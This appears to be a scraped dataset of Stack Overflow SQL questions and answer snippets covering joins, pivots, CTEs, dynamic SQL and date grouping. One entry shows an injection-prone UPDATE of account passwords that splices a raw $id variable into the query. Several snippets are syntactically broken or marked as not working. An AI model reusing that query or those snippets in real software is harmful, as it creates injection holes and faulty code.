        [business_setup_secondary_workphone] ,
        [business_setup_pay_via] ,
        [business_setup_paypal_id] ,
    FROM [bulk_data]

    /*
        before you execute this, make sure to include all not null column names in select list 
        I assume [subscription_type] exists in business_info table
    */
    INSERT INTO business_info ([business_info_short_description] ,
        [business_info_long_description] ,
        [business_info_hours_Sunday] ,
        [business_info_hours_Monday] ,
        [business_info_hours_Tuesday] ,
        [business_info_hours_wednesday] ,
        [business_info_hours_Thursday] ,
        [business_info_hours_Friday] ,
        [business_info_hours_Saturday] ,
        [business_info_starttime] ,
        [business_info_endtime] ,
        [business_info_webonly] ,
        [business_info_telephoneonly] ,
        [business_info_appointmentonly] ,
        [business_info_speciality_Acupuncture] ,
        [business_info_speciality_Chiropractor] ,
        [business_info_speciality_Conventional] ,
        [business_info_speciality_Dentist] ,
        [business_info_speciality_ElderlyCare] ,
        [business_info_speciality_EyeCare] ,
        [business_info_speciality_General] ,
        [business_info_speciality_HealthCoach] ,
        [business_info_speciality_Homeopathy] ,
        [business_info_speciality_LifeCoach] ,
        [business_info_speciality_Meditation] ,
        [business_info_speciality_MyofacialTherapy] ,
        [business_info_speciality_Naturopathy] ,
        [business_info_speciality_NutritionHealthyCooking] ,
        [business_info_speciality_Pilates] ,
        [business_info_speciality_WellnessCenter] ,
        [business_info_speciality_Yoga] ,
        [subscription_type])
    SELECT
        [business_info_short_description] ,
        [business_info_long_description] ,
        [business_info_hours_Sunday] ,
        [business_info_hours_Monday] ,
        [business_info_hours_Tuesday] ,
        [business_info_hours_wednesday] ,
        [business_info_hours_Thursday] ,
        [business_info_hours_Friday] ,
        [business_info_hours_Saturday] ,
        [business_info_starttime] ,
        [business_info_endtime] ,
        [business_info_webonly] ,
        [business_info_telephoneonly] ,
        [business_info_appointmentonly] ,
        [business_info_speciality_Acupuncture] ,
        [business_info_speciality_Chiropractor] ,
        [business_info_speciality_Conventional] ,
        [business_info_speciality_Dentist] ,
        [business_info_speciality_ElderlyCare] ,
        [business_info_speciality_EyeCare] ,
        [business_info_speciality_General] ,
        [business_info_speciality_HealthCoach] ,
        [business_info_speciality_Homeopathy] ,
        [business_info_speciality_LifeCoach] ,
        [business_info_speciality_Meditation] ,
        [business_info_speciality_MyofacialTherapy] ,
        [business_info_speciality_Naturopathy] ,
        [business_info_speciality_NutritionHealthyCooking] ,
        [business_info_speciality_Pilates] ,
        [business_info_speciality_WellnessCenter] ,
        [business_info_speciality_Yoga] ,
        [subscription_type]
    FROM [bulk_data]
END
"
4427,45830,SQL - group by both bits,"select IsItTrue, count(id) as Amount from 
(select IsItTrue, id from table
union
select 1 as IsItTrue, null as id
union
select 0 as IsItTrue, null as id) t
group by bool
"
32080,55258,How to auto-redefine view when underlying table changes (new column)?,"SQL> create table t (id number);

Table created

SQL> create view v as select * from t;

View created

SQL> select text from user_views where view_name = 'V';

TEXT
-------------------------------------------------------
select ""ID"" from t
"
10013,66898,how can i query the record so that i can display them each month wise,"CREATE TABLE TEST(ID INT IDENTITY(1,1),PRICE INT,CREATEDDATE DATE)

INSERT INTO TEST VALUES
(100,'2015-09-17'),
(200,'2015-09-17'),
(300,'2015-08-17'),
(400,'2015-08-17'),
(500,'2015-08-17'),
(600,'2015-07-17')

SELECT MONTH(CREATEDDATE),YEAR(CREATEDDATE),SUM(PRICE)
FROM TEST
GROUP BY MONTH(CREATEDDATE),YEAR(CREATEDDATE)
"
32618,59243,How to traverse a path in a table with id & parentId?,"CREATE FUNCTION GetID 
(
    @path VARCHAR(MAX)
)

/* TEST:
SELECT dbo.GetID('A/B/C/E')

*/
RETURNS INT 
AS
BEGIN
    DECLARE @ID INT;

    WITH cte AS (
        SELECT p.id ,
               p.parentId ,
               CAST(p.name AS VARCHAR(MAX)) AS name
        FROM tblT p
        WHERE parentId IS NULL

        UNION ALL
        SELECT p.id ,
               p.parentId ,
               CAST(pcte.name + '/' + p.name AS VARCHAR(MAX)) AS name
        FROM dbo.tblT p
        INNER JOIN cte pcte ON
            pcte.id = p.parentId
    )
    SELECT @ID = id
    FROM cte
    WHERE name = @path

    RETURN @ID
END
"
32716,29859,SQL Server: return placeholder / text if Left Join has no result,"coalesce(E.itemName, '---') as levelMain
coalesce(D.itemName, '---') as levelSub
"
1392,3128,"SQL - sum of some rows, minus sum of other rows","select customer_code,
       sum(case
             when trans_type = 'DRINV' then
              trans_value
             else
              -trans_value
           end) as net_sales
  from dr_trans
 group by customer_code
"
19399,69964,PostgreSQL: What's an efficient way to update 3m records?,"CREATE TABLE joined_comments
    AS SELECT c.id, c.author, c.blablabla, ce.body
    FROM comments c LEFT JOIN comment_extensions ce
    ON c.id = ce.comment_id;
"
32705,55043,"Is there a way to return SELECT results sorted by order of ""WHERE IN"" values?","SELECT * FROM tablename WHERE id IN (5,3,8,9)
ORDER BY 
CASE id
    WHEN 5 THEN 1
    WHEN 3 THEN 2
    WHEN 8 THEN 3
    WHEN 9 THEN 4
    ELSE 5
  END
"
9941,75371,How to skip static(hardcoded entry) entry in PostgreSQL if value is NULL?,"select d.description as description,d.upload_count as count
from
(select a.doc_type,b.description,count(*) as upload_count
from case_uploads a,doc_type b
where a.doc_type = b.doc_type
and a.upload_dt >= $P{START_DATE}
and a.upload_dt <= $P{END_DATE}
group by a.doc_type,b.description) d
where d.doc_type not in ('215','F35')
and d.upload_count IS NOT NULL

union all

select 'Applications' as description,SUM(d.upload_count) as count
from
(select a.doc_type,b.description,count(*) as upload_count
from case_uploads a,doc_type b
where a.doc_type = b.doc_type
and a.upload_dt >= $P{START_DATE}
and a.upload_dt <= $P{END_DATE}
group by a.doc_type,b.description) d
where d.doc_type in ('215','F35')
having SUM(d.upload_count) IS NOT NULL
"
29115,46652,Return 2 records from Select Statement with different Where Clause,"SELECT first.qTicker, FirstClose, SecondClose,
(FirstClose - SecondClose) as CloseDifference
FROM
(
    SELECT qTicker, qClose as FirstClose FROM Quotes
    WHERE qDate = #5/15/2015#
) first
INNER JOIN
(
    SELECT qTicker, qClose as SecondClose FROM Quotes
    WHERE qDate = #5/10/2015#
) second
ON
first.qTicker = second.qTicker
WHERE
first.qTicker = ""A""
"
2166,33052,Modify Select with Variable such that it can be used in a Set operation,"select  LossAmount, n.percentiles
from   (select  LossAmount, 
                seq = ROW_NUMBER() over (order by LossAmount desc) 
        from    dbo.TestXB_TotalLoss) as p
join   (Select ((select COUNT(*) from dbo.TestXB_TotalLoss)-((select COUNT(*) from dbo.TestXB_TotalLoss)*percentiles)) As seq, percentiles
        From    dbo.Percentiles) n
        On  p.seq = n.seq
"
20167,17177,populate blank columns using update statment,"update est
    set (eq_id, order_id) = (select est2.eq_id, est2.order_id
                             from est est2
                             where est2.a_number = est.a_number and
                                   est2.c_cd = est.c_cd and
                                   est2.personid = est.personid and
                                   rownum = 1
                            )
    where eq_id = 0 and orderid = 0;
"
6763,28482,MySQL SELECT and GROUPING,"SET @sql = '';
SELECT
  GROUP_CONCAT(DISTINCT
    CONCAT(
      'SUM(CASE WHEN t.ticket_status = ''',
      id,
      ''' THEN 1 ELSE 0 END) `',
      name, '`'
    )
  ) INTO @sql
FROM
  status;

SET @sql = CONCAT
('SELECT g.name, ', @sql, ' 
    FROM tickets t JOIN status s
      ON t.ticket_status = s.id JOIN groups g
      ON t.ticket_group_id = g.id 
   GROUP BY t.ticket_group_id,  g.name'
);

PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;
"
904,17181,SQL command for reading all columns in the first row,"Sub ListFieldADO()

    strFile = Workbooks(1).FullName
    strCon = ""Provider=Microsoft.Jet.OLEDB.4.0;Data Source="" & strFile _
        & "";Extended Properties=""""Excel 8.0;HDR=Yes;IMEX=1"""";""


    Set cn = CreateObject(""ADODB.Connection"")

    cn.Open strCon

    ''You can also use the name of a named range
    Set rs = cn.OpenSchema(adSchemaColumns, _
        Array(Empty, Empty, ""Sheet1$"")) 
    While Not rs.EOF
        Debug.Print ""     "" & rs!Column_Name
        rs.MoveNext
    Wend

    rs.Close
    Set rs = Nothing
End Sub
"
19337,60478,LEFT JOIN - How to join tables and include extra row even if you have right match,"SELECT A.ID, A.ProductName, B.ID, B.Size
FROM A
INNER JOIN B
ON B.ProductID = A.ID
UNION ALL
SELECT A.ID, A.ProductName, NULL, NULL
FROM A
"
21839,40737,How can I convert a column value to a xml element name using SQL and FOR XML,"with data as (
    select * from (
    values (1, 'joe@email.com', 'Joe', 'To', 1),
            (1, 'Bob@email.com', 'Bob', 'From', 2),
            (1, 'Max@email.com', null, 'To', 3),
            (1, 'Secret@email.com', 'Secret', 'Bcc', 4)
    ) t(MessageID, EMailAddress, DisplayName, RecipientType, Ordering)
    where MessageID = 1
), pivoted as (
    select *
    from data pivot (max(EmailAddress) for RecipientType in ([To], [From], [Bcc])) t
)
select (case when [To] is not null then DisplayName else null end) as 'to/displayName', [To] as 'to/address',
        (case when [From] is not null then DisplayName else null end) as 'from/displayName', [From] as 'from/address',
        (case when [Bcc] is not null then DisplayName else null end) as 'bcc/displayName', [Bcc] as 'bcc/address'
from pivoted
order by Ordering
for xml path('')
"
15939,35944,Get information about collection element type,"SQL> create type t_coll_type is table of varchar2(10 byte);
  2  /

Type created

SQL> 
SQL> select type_name
  2       , elem_type_name
  3       , char_used
  4    from all_coll_types
  5  where type_name = 'T_COLL_TYPE'
  6  ;

TYPE_NAME                      ELEM_TYPE_NAME                 CHAR_USED
------------------------------ ------------------------------ ---------
T_COLL_TYPE                    VARCHAR2                       B

SQL> create type t_coll_type2 is table of varchar2(10 char);
  2  /

Type created

SQL> 
SQL> select type_name
  2       , elem_type_name
  3       , char_used
  4    from all_coll_types
  5  where type_name = 'T_COLL_TYPE2'
  6  ;

TYPE_NAME                      ELEM_TYPE_NAME                 CHAR_USED
------------------------------ ------------------------------ ---------
T_COLL_TYPE2                   VARCHAR2                       C
"
26238,63614,How to make a dynamic limit in MySQL?,"(SELECT id, event, seen, time_stamp 
 FROM notifications n
 WHERE id_user = :id AND seen IS NULL
)UNION
(SELECT id, event, seen, time_stamp
 FROM notification n
 WHERE id_user = :id AND seen IS NOT NULL
 LIMIT 2
)UNION 
(SELECT id, event, seen, time_stamp 
 FROM notifications n
 WHERE id_user = :id 
 ORDER BY (seen IS NULL) desc, time_stamp desc
 LIMIT 15
)
ORDER BY (seen IS NULL) desc, time_stamp desc;
"
20524,62603,Select time difference in minutes for this months portion only,"with month_start_finish (month_start, month_finish) as 
(
  -- here you get the beginning of the current month and the next month
  -- needed for filters and calculations
  select 
    dateadd(month, datediff(month, 0, getdate()), 0),
    dateadd(month, datediff(month, 0, getdate()) + 1, 0)  
)
select start_date, finish_date,
  -- here you calculate your minutes
  datediff(minute, 
           case when start_date > month_start then start_date else month_start end,
           case when finish_date < month_finish then finish_date else month_finish end
          ) as minutes_in_this_month
from test, month_start_finish
where start_date < month_finish -- here you remove any periods that
and finish_date > month_start   -- are not related to the current month
"
3837,14291,How to set a privileges on Table/Schema in oracle,"GRANT SELECT ON <table_name> TO <user_name>;
"
37188,61535,Filtering with Listboxes in Access 2010,"SELECT IIF(fr.fltrState=0 or fr.fltrState IS NULL, 9999, fr.fltrState) AS IIFState,
       IIF(fr.fltrGen IS NULL, 9999, fr.fltrGen)  AS IIFGen
FROM 999_filterTable AS fr
"
28437,4745,How to verify Oracle Sequences,"SELECT (SELECT last_number
          FROM all_sequences
         WHERE sequence_name = 'ACCOUNT_CODE_DEFINITION_SEQ'
           AND sequence_owner = 'SQUIGGLY') max_sequence,
       (SELECT MAX(id_number) 
          FROM squiggly.ACCOUNT_CODE_DEFINITION) max_id_number
  FROM dual
"
24446,33027,Querying with foreign key,"select 
    B.* 
from 
    tableB as B 
    join tableA as A 
        on B.tableA_id=A.id 
where 
    A1='foo'
"
20536,28027,Oracle SQL - Joining list of values to a field with those values concatenated,"SELECT *
FROM tableA a
WHERE EXISTS(
   SELECT 1 FROM tableB b
   WHERE   
       ','|| trim( trim( BOTH '*' FROM a.Modifier )) ||','
       LIKE  '%,'|| b.mod || ',%'
);
"
18124,21496,Mysql change delimiter for better SQL INJECTION handling?,"UPDATE Accounts SET PASSWORD = '...' WHERE account_id = $id
"
29034,59202,design for DB when needed to know lastest for something,"SELECT
  tr1.id AS id,
  dsv.idSite_id AS idSite,
  tr1.idSiteVersion_id AS idSiteVersion,
  tr1.idTest_id AS idTest,
  tr1.result AS result,
  tr1.timeStarted AS timeStarted,
FROM 
  dash.testresult AS tr1 
  NATURAL JOIN (
    SELECT idTest_id, idSiteVersion_id, MAX(timeEnd) AS timeEnd
    FROM dash.testresult
    WHERE timeEnd IS NOT NULL
    GROUP BY idTest_id, idSiteVersion_id
  ) AS tr2
  JOIN dash.siteversion AS dsv
    ON dsv.id = tr1.idSiteVersion_id
  JOIN dash.test AS dtest
    ON dtest.id = tr1.idTest_id AND dtest.ignored = 0
"
14439,72413,SQL Sorting within a sort,"ORDER  BY CASE position
            WHEN 'Manager' THEN 1
            WHEN 'Secretary' THEN 2
            WHEN 'Supervisor' THEN 3
            WHEN 'Assistant' THEN 4
            ELSE 99
          END,
          lName; 
"
26188,39311,Using basic joins in sequel,"Project.join(:users, :id=>:user_id).
 select(:projects.*).
 first(:users__name=>user_name, :projects__name=>project_name)
"
25074,38,Join Parts of the Newest Item in Another Table using a View,"CREATE VIEW [dbo].[vw_ForumsAndStats] AS
SELECT 
    f.*,
    COUNT(t.ThreadID) AS NumberOfThreads,
    p.PostID AS MostRecentPostID,
    p.ThreadID AS MostRecentPostThreadID,
    p.UserID AS MostRecentPostUserID
FROM tbl_Forums f
JOIN tbl_Forum_Threads t ON t.ForumID = f.ForumID
LEFT JOIN (SELECT t.ForumID, MAX(p.PostID) as MaxPostID 
           FROM tbl_Forum_Posts p
           JOIN tbl_Forum_Threads t ON p.ThreadID = t.ThreadID
           GROUP BY t.ForumID
          ) as MostRecentPost ON MostRecentPost.ForumID = f.ForumID
LEFT JOIN tbl_Forum_Posts p ON MostRecentPost.MaxPostID = p.PostID
GROUP BY f.ForumID, F.Name, p.PostID, p.ThreadID, p.UserID
"
35687,26422,Pivot Sql Query Returns unwanted row,"select name, [Sql Server], [Asp.net], [c#], [Winforms] from
(
    select st.name, su.[subject],
    Case When su.[subject] IS NULL OR st.name IS NULL THEN 'FALSE' ELSE 'TRUE' END as VALUE 
    FROM @Students st  FULL outer join @StudentSubjects ss on st.id = ss.studentid
    FULL Outer join @Subjects su on su.id = ss.subjectid
    where st.name is not null
) as x

pivot
(
    MIN(value)
    for [subject] in ([Sql Server], [Asp.net], [c#], [Winforms])
)pv
"
31359,61852,Select Max two rows of each account SQL Server,"  select id, age, accnum, name 
  from 
  (
     select id, age, accnum, name, ROW_NUMBER() Over (Partition By accnum order by age desc) as rn
     from yourtable
  ) a
  where a.rn <= 2
"
19259,51812,How To Create Generic SQL Server Stored Procedure To Perform Inserts Into Audit Table Based on Inserted and Deleted In Trigger,"select <list of tracked columns here> into #deleted from deleted;

declare /*const*/ @TABLE_NAME sysname = '[table name]';

declare f cursor
local
forward_only
read_only
for
  select c.name, quotename(c.name, '[')
  from
    sys.columns c
    inner join sys.types t on c.system_type_id = t.system_type_id
  where
    c.object_id = object_id(@TABLE_NAME)
    and c.is_computed = 0
    and c.is_identity = 0
    and t.name not in ('text', 'image', 'timestamp', 'xml')
    and (substring(COLUMNS_UPDATED(), ((c.column_id - 1) / 8) + 1, 1) & power(2, (c.column_id - 1) % 8)) > 0
  ;

declare @field_name sysname, @field_name_sanitised sysname;
create table #results (row_id int not null, field_name sysname not null, oldval nvarchar(150) null, newval nvarchar(150) null);

-- For each changed field, insert what exactly changed into #results

open f;

fetch next from f into @field_name, @field_name_sanitised;
while @@fetch_status = 0
begin
  declare @query nvarchar(4000);

  set @query =  N'insert into #results(row_id, field_name, oldval, newval)
                  select d.row_id, @field_name, d.' + @field_name_sanitised + N', i.' + @field_name_sanitised + N'
                  from
                    #deleted d inner join ' + @TABLE_NAME + N' i on d.row_id = i.row_id
                  where
                    (d.' + @field_name_sanitised + N' <> i.' + @field_name_sanitised + N')
                    or
                    (case when d.' + @field_name_sanitised + N' is null then 1 else 0 end <> case when i.' + @field_name_sanitised + N' is null then 1 else 0 end);'
                ;    

  exec sp_executesql
    @stmt = @query,
    @params = N'@field_name sysname',
    @field_name = @field_name
  ;

  fetch next from f into @field_name, @field_name_sanitised;
end;

close f;
deallocate f;

-- Do something meaningful to #results here
"
19069,51160,Optional Reporting Parameters (is there a better way?),"WHERE 
  col1 = isnull(@col1, col1) 
  and col2 = isnull(@col2, col2)
  ...etc
"
36449,29582,SQL Join query to return sum and most recent entries,"select oca.name, oca.agentname, oca.sales, oca.lastSaleDate,
       o.amount as lastSaleAmount
from (select c.id, c.name, a.name as agentname, sum(o.amount) as sales,
             max(o.date) as lastSaleDate
      from orders o join
           customers c
           on o.cust_id = c.id join
           agents a
           on c.id = a.cust_id
      group by c.id, c.name, a.name
     ) oca join
     orders o
     on o.cust_id = oca.cust_id and oca.lastSaleDate = o.date
"
33591,40303,change-data-capture from many tables via a single stored procedure?,"DECLARE @sql nvarchar(4000)
    SET @sql = N'SELECT * FROM cdc.fn_cdc_get_net_changes_dbo_'+cast(@TABLE as varchar)+'(@begin_lsn, @end_lsn, 'all')'


EXEC sp_executesql @sql, N'@Table varchar(50), @BeginTime datetime, @EndTime datetime',@Table,@BeginTime,@EndTime
"
39949,31927,How do we implement an IS-A Relationship?,"CREATE TABLE Employee (
ast VARCHAR(20) not null,
firstname VARCHAR(200) not null,
surname VARCHAR(200) not null,
...
PRIMARY KEY(ast)
);

CREATE TABLE Administrative (
employee_ast VARCHAR(20) not null REFERENCES Employee(ast),
PRIMARY KEY(employee_ast)
);

CREATE TABLE Technical (
employee_ast VARCHAR(20) not null REFERENCES Employee(ast),
...
PRIMARY KEY(employee_ast)
);
"
781,63085,how to change particular column cell foreground and background color in oracle forms 6i using visual attribute,"set_item_instance_property('EMP.SAL', current_record, visual_attribute,'VA_COLOR' );
"
14019,5884,sql group by per month and year with one row id,"select month, year,
       (case when min(id) = max(id) then min(id) end) as id
from t
group by month, year;
"
29802,66691,MySQL Select Based on Conditional Select,"SELECT
    t.ID,
    t.Reference,
    COALESCE(reffed.Name, t.name) AS name,
    COALESCE(reffed.whatever, t.whatever) AS whatever,
    COALESCE(... and so on ...)
  FROM details t
  LEFT OUTER JOIN details reffed ON t.Reference = reffed.id
"
20954,16806,Calculating average minutes for items within different time frames,"SELECT TRUNC(((MAX(MODIFIED END)-
               MIN(ADDED ))*24*60)/COUNT(TRANSACTIONS) as grand_average,
       TRUNC(((MAX(TO_CHAR(ADDED, 'HH24') BETWEEN 09 AND 11 THEN MODIFIED END)-
               MIN(TO_CHAR(ADDED, 'HH24') BETWEEN 09 AND 11 THEN ADDED END))*24*60)/COUNT(TRANSACTIONS)
             ) +
       TRUNC(((MAX(TO_CHAR(ADDED, 'HH24') BETWEEN 15 AND 19 THEN MODIFIED END)-
               MIN(TO_CHAR(ADDED, 'HH24') BETWEEN 15 AND 19 THEN ADDED END))*24*60)/COUNT(TRANSACTIONS) AS subsets_average
FROM TABLE
"
28672,7650,Query records between two dates using VB.net/MS Access,"Dim dtDate1 as DateTime = DateTime.Parse(date1.text)
Dim dtDate2 as DateTime = DateTime.Parse(date2.text)

Dim cmd1 As OleDbCommand = New OleDbCommand(""SELECT * from stockitems where stdate Between #"" & _
                                            dtDate1.ToString(""MM/dd/yyyy"") & ""# And #"" & _
                                            dtDate2.ToString(""MM/dd/yyyy"") & ""#"",con)
"
21213,51215,SQL - Return rows with most column matches,"select name, color1, color2, color3, prize 
  from (
    select t.*, rank() over (order by decode(color1, 'Red', 1, 0) 
        + decode(color2, 'Blue', 1, 0) + decode(color3, 'Green', 1, 0) desc) rnk
      from t)
  where rnk = 1
"
34864,22604,Sql Multi-selecting one line from subgroups inside the same table,"WITH CTE
AS
(
   SELECT *,
     ROW_NUMBER() OVER(PARTITION BY group_s 
                       ORDER BY newid()) AS RN
   FROM yourTable
)
SELECT id , group_s , name
FROM CTE
WHERE RN = 1;
"
13408,71727,SQL - Is it possible to join a table to a resultset created by several select/union-alls?,"select te.*, t.Ord from tblEntity te
inner join (
    SELECT 1 as Id, 2 as Ord
    UNION ALL
    SELECT 2, 1
) t on te.ID = t.Id
"
17658,27431,SQL Database Design for SSIS,"  --get the smallest SequenceId with an unfilled AdoptedBudget
  Select min(SequenceID), 
    ProjectNumber, 
    FiscalYearBegin, 
    SubProjectNumber --any other fields needed for the join
  From Budgets b
  Where AdoptedBudget is null
  Group By 
    ProjectNumber, 
    FiscalYearBegin, 
    SubProjectNumber --any other fields needed for the join


--This won't work I don't believe
Update Budgets
Set AdoptedBudget = BudgetAmount
From Budgets b
Inner Join SourceAdoptedBudgets ab on 
  b.ProjectNumber = ab.ProjectNumber
  b.FiscalYearBegin = ab.FiscalYearBegin
  b.FiscalYearEnd = ab.FiscalYearEnd
Inner Join
(
  --get the smallest SequenceId with an unfilled AdoptedBudget
  Select min(SequenceID), 
    ProjectNumber, 
    FiscalYearBegin, 
    SubProjectNumber --any other fields needed for the join
  From Budgets b
  Where AdoptedBudget is null
  Group By 
    ProjectNumber, 
    FiscalYearBegin, 
    SubProjectNumber --any other fields needed for the join
) as nextBudgets
on --the join fields again
"
13784,63222,How do I get the highest currently used ID number in a table with LINQ?,"DataContext db = new DataContext();
var nameCount = db.Names.Count();

var nameCount = db.Names.Select(n => n.Id).Max();
"
31615,36437,Check for absence of data,"select clinic_id
from Sessions_List
group by clinic_id
having sum(case when session_date = 20150121 then 1 else 0 end) > 0 and
       sum(case when session_date = 20160128 then 1 else 0 end) = 0;
"
20852,13914,LINQ: Split Where OR conditions,"var queries = new List<IQueryable<Session>>();
if (!String.IsNullOrEmpty(Division)) {
    queries.Add(sessions.Where(y => y.session.SESSION_DIVISION.Any(x => x.DIVISION.ToUpper().Contains(SearchContent))));
}

if (!String.IsNullOrEmpty(Room)) {

    // this shoudl be OR
    queries.Add(sessions.Where(y => y.session.ROOM.ToUpper().Contains(SearchContent)));
}

if (!String.IsNullOrEmpty(course)) {

    // this shoudl be OR
    queries.Add(sessions.Where(y => y.session.COURSE.ToUpper().Contains(SearchContent)));
}

sessions = queries.Aggregate(sessions.Where(y => false), (q1, q2) => q1.Union(q2));
"
16590,24166,Finding unique/new values among an existing dataset by date with mysql by data import date,"SELECT DISTINCT ChemID
FROM Chem_CaseReports a 
WHERE a.ImportDate = '2012-06-12 05:58:16'
AND NOT EXISTS
(
 SELECT * FROM Chem_CaseReports b 
 WHERE a.ChemID = b.ChemID
 AND b.ImportDate < '2012-06-12 05:58:16'
)
"
32241,5108,how to write Recursive CTE in SQL server 2012 for hour and min,";WITH cte AS (SELECT DATEADD(day, 0, DATEDIFF(day, 0, GETDATE())) dt
              UNION  ALL
              SELECT DATEADD(MINUTE, 30, dt) AS dt
              FROM cte
              WHERE dt < DATEADD(day,1,GETDATE())
              )
SELECT CONVERT(VARCHAR(12),dt, 108)
FROM  cte
"
24096,23937,Determine if Oracle date is on a weekend?,"SELECT *
FROM mytable
WHERE MOD(TO_CHAR(my_date, 'J'), 7) + 1 IN (6, 7);
"
22894,19643,Return max value from a SQL selection,"select top 1 *
From (
     select count(license) as Quantity,[user],[date]
     From license_Usage
     Group by [date], [user]
    ) as result
order by Quantity desc
"
7208,60904,How to eliminate delimiter during concatenation if a column is NULL/Has no Data,"SELECT LASTNAME + case when FIRSTNAME is null
                       then ''
                       else ',' + FIRSTNAME
                  end AS NAME
 FROM MyTable;
"
1207,50911,How can I list all foreign keys referencing a given table in SQL Server?,"EXEC sp_fkeys 'TableName'
"
26426,30777,Select SUM by each year in SQL query,"CREATE VIEW dbo.vwMaxExpenseDate
AS 
    SELECT product_id, MAX(expense_date) AS 'max_expense_date'
    FROM Expense
    GROUP BY product_id

DECLARE @PossibleYearRange TABLE
(
    product_id INT,
    YearStart DATETIME,
    YearEnd DATETIME
);

WITH CTE
AS
(
    SELECT p.product_id, max_expense_date, purchase_date, 1 As Number
    FROM Product p
    LEFT JOIN vwMaxExpenseDate e
    ON p.product_id = e.product_id

    UNION ALL

    SELECT product_id, max_expense_date, purchase_date, Number + 1
    FROM CTE
    WHERE Number <= (YEAR(max_expense_date) - YEAR(purchase_date)) 
)
INSERT INTO @PossibleYearRange
(
    product_id,
    YearStart,
    YearEnd
)
SELECT product_id, 
        CONVERT(DATETIME, CONVERT(VARCHAR(20), YEAR(purchase_date) + Number - 1) + '-' 
            + CONVERT(VARCHAR(20), MONTH(purchase_date)) + '-' 
            + CONVERT(VARCHAR(20), DAY(purchase_date))) AS 'YearStart',
        CONVERT(DATETIME, CONVERT(VARCHAR(20), YEAR(purchase_date) + Number) + '-' 
            + CONVERT(VARCHAR(20), MONTH(purchase_date)) + '-' 
            + CONVERT(VARCHAR(20), DAY(purchase_date))) AS 'YearEnd'
FROM CTE
ORDER BY product_id ASC, NUMBER ASC

SELECT MAX(p.product_id) AS product_id, MAX(product_name) AS product_name, YearStart, YearEnd, COALESCE(SUM(expense), 0) AS TotalExpensePerYear
FROM @PossibleYearRange p
LEFT JOIN Expense e
ON p.product_id = e.product_id AND
expense_date BETWEEN YearStart AND YearEnd
INNER JOIN Product d 
ON p.product_id = d.product_id
GROUP BY YearStart, YearEnd
ORDER BY MAX(p.product_id) ASC
"
10254,158,SQL COUNT between dates in two different column,"SELECT COUNT(Student)
FROM YourTable
WHERE Start >= @Start 
    AND End <= @End
"
22333,55558,Get the lowest date for each row,"select id, least(first_date, second_date, thrid_date)
from ...
"
16893,50050,"Query returns correct results, stored proc does not. Need a second set of eyes","select 
    * 
from 
    meet_cert_credit 
where 
    Conf_number = '1' 
    and type_of_professional = 'C'
"
22580,17892,Basic syntax for CREATE TABLE in PostgreSQL,"CREATE TABLE IF NOT EXISTS sequences (
  SEQU_NK   SERIAL PRIMARY KEY NOT NULL UNIQUE,
  NOM_SEQU varchar(30) NOT NULL,
  PROCHAIN bigint NOT NULL,
  CONSTRAINT ""IDX_SEQU_NOM"" UNIQUE (NOM_SEQU)
) 
"
26283,20947,Search by alias without showing the alias,"select c.*, count(i.item_id) as numitems
from category c left outer join
     (SELECT i.*, ( 3959 * acos( cos( radians(52.993252) ) * cos( radians( latitude ) ) 
                   * cos( radians( longitude ) - radians(-0.412470) ) + sin( radians(52.993252) ) 
                   * sin( radians( latitude ) ) )
                  ) AS distance 
      FROM items i
     ) i
     on c.category_id = i.category_id and distance < 1
group by category_id;
"
24150,58887,count how many rows from parent table exist in other 2 tables,"     SELECT COUNT(distinct l.protocol) as parent
           ,COUNT(distinct e.protocol) as tbl2
           ,COUNT(distinct n.protocol) as tbl3
    FROM parent L
    LEFT JOIN tbl2 E on L.protocol=E.protocol
    LEFT JOIN tbl3 N on L.protocol=N.protocol
    UNION ALL 
    --same for the LOP count  
"
26246,72708,Return Max Dates from Multible Table Join,"SELECT
    c.cid,
    c.name,
    cv.service,
    max_date = CONVERT(VARCHAR(10), MAX(va.approved_on), 101)
FROM Client c
LEFT JOIN ClientVisit cv
    ON c.cid = cv.cid
    AND cv.service = 'Eval'
LEFT JOIN VisitApproval va
    ON va.vid = cv.vid
GROUP BY
    c.cid, c.name, cv.service
"
25086,3257,Is it possible from a DB2 (or any other sql) query to fetch rows selectively as shown below?,"SELECT * FROM T AS T1 
  WHERE STATUS='fail'
    AND NOT EXISTS (SELECT * FROM T 
                       WHERE STATUS='Success'
                             AND TIME>T1.TIME 
                             AND TIME<=
                              (
                                SELECT TIME FROM T as T2
                                       WHERE STATUS='fail'
                                       AND NOT EXISTS (SELECT * FROM T 
                                                         WHERE TIME>T2.TIME 
                                                            AND STATUS='Fail')

                              )
                     ) 
"
6309,3191,How to overwrite values during a select query in sql?,"SELECT name, newValue as age
from yourTable
"
33058,73399,Grouping SQL results from a Union,"SELECT FollowerID AS reference_user, FollowedUserID AS connection
  FROM Follows
 WHERE FollowerID = 1
UNION
SELECT FollowedUserID AS reference_user, FollowerID AS connection
  FROM Follows
 WHERE FollowedUserID = 1
GROUP BY reference_user;
"
31023,15082,SQL server - use most recent value after replacement,"declare @t table(id int, create_date datetime, industry varchar(50))

insert @t values(1,'20121201', 'retail')
insert @t values(1,'19691231', 'leisure and tourism')
insert @t values(1,'20101001', 'telesales')
insert @t values(2,'20100201', 'finance')
insert @t values(2,'20100201', 'retail')
insert @t values(2,'20090801', 'finance')



;with a as
(
  select id, industry, case when create_date = convert(datetime, '31/12/1969', 104)
  then current_timestamp else create_date end create_date, min(create_date) over (partition by id) chk,
  row_number() over (partition by id order by case when create_date = convert(datetime, '31/12/1969', 104) then 1 else 2 end, create_date desc) rn
  from @t
), b as
(
  select * from a
  where rn = 1 or chk <> convert(datetime, '31/12/1969', 104)
)
select b.id, max(create_date) create_date
,STUFF(( 
    select distinct  ',' + industry
    from b b1 
    where b1.id = b.id
    for xml path(''), type 
).value('.', 'varchar(max)'), 1, 1, '') [industries] 
from b
group by b.id 

id  create_date             industries
1   2014-01-21 16:36:41.010 leisure and tourism
2   2010-02-01 00:00:00.000 finance,retail
"
33505,37128,SQL add Foreign key constraint with check,"IF NOT EXISTS ( SELECT * FROM sys.foreign_keys 
                WHERE name = 'fk_vMessageType' )
BEGIN
    EXEC ('
    ALTER TABLE HL7_MessageHierarchy  
     ADD CONSTRAINT fk_vMessageType FOREIGN KEY (vMessageType) 
           REFERENCES HL7_MessageType(vMessageType)
    ')
END
"
18081,18972,mysql relationship table splitting the ids between x amount of tables,"+---------------------------+
| load                      | 
+---------------------------+
| load_id                   |
|                           |
+---------------------------+

+-------------+
| transport   |
+-------------+
| id          |
| type        |  
|             |
+-------------+

+---------------------------+
| load_transport            | 
+---------------------------+
| load_id                   |
| transport_id              |
+---------------------------+
"
